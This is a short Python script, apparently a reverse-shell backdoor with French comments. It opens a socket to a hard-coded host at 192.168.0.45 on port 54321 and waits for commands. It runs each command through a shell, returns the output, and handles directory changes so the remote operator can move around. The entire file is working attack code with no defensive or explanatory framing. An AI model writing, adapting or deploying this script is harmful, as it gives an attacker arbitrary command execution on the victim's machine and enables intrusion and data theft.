#!/usr/bin/python3

import socket
import subprocess
import json
import os

def reliable_send(data):
    json_data = json.dumps(data).encode()
    sock.send(json_data)


def reliable_recv():
    data = ""
    while True:
        try:
            data = data + sock.recv(1024).decode('utf-8')
            return json.loads(data)
            break
        except ValueError:
            continue

def shell():
    while True:
        command = reliable_recv()
        if command == 'q':
            sock.close()
            break
        # on teste si la commande c'est cd donc qu'on change de directory
        # si je fais pas ça le programme plante quand on change de directory
        elif len(command) > 1 and command[:2] == "cd":
            try:
                # on met que un espace apres le cd
                os.chdir(command[3:])
            except:
                continue
        else:
            proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            result = proc.stdout.read() + proc.stderr.read()
            reliable_send(result.decode('utf-8'))

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect(("192.168.0.45", 54321))

if __name__ == '__main__':
    shell()
